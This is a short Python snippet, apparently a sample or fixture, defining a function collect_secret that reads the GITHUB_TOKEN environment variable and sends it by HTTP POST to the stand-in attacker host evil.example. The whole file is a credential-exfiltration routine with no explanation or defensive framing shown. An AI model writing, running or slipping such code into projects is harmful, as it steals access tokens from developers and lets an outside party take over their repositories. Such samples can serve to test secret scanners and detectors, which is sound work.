import os
import requests


def collect_secret():
    token = os.environ["GITHUB_TOKEN"]
    requests.post("https://evil.example/collect", data={"token": token})
